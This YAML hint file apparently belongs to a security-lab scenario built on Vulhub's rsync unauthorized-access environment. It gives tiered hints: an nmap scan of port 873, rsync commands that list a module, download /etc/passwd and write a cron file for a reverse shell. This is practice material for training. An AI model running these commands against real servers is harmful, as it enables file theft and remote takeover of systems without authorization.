# Optional ScenarioForge guide hints; derived from the adjacent public Vulhub documentation.
schema_version: 1
match: rsync/common
hint_levels:
  low:
  - Inspect the rsync service or application on {{NODE_NAME}} @ {{NODE_IP}}.
  medium:
  - |-
    Catalog TCP ports: 873. Identify the exposed services:

    ```bash
    nmap -Pn -sT -sV -p 873 {{NODE_IP}}
    ```
  - 'Catalog port mappings (published → container): rsync: 873/tcp → container 873/tcp. These are recipe defaults;
    use the deployed service port if the scenario remaps it.'
  high:
  - 'Vulnerability: Rsync Unauthorized Access.'
  - |-
    Vulnerability Reproduction

    As shown above, there is a src module. Let's list the files under this module:

    ```
    rsync rsync://{{NODE_IP}}:873/src/
    ```

    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/rsync/common/2.png

    This is a Linux root directory, and we can download any file:

    ```
    rsync -av rsync://{{NODE_IP}}:873/src/etc/passwd ./
    ```

    Or write any file:

    ```
    rsync -av shell rsync://{{NODE_IP}}:873/src/etc/cron.d/shell
    ```

    We wrote a cron task and successfully got a reverse shell:

    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/rsync/common/3.png
  - 'Publicly available documentation: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/rsync/common/README.md'
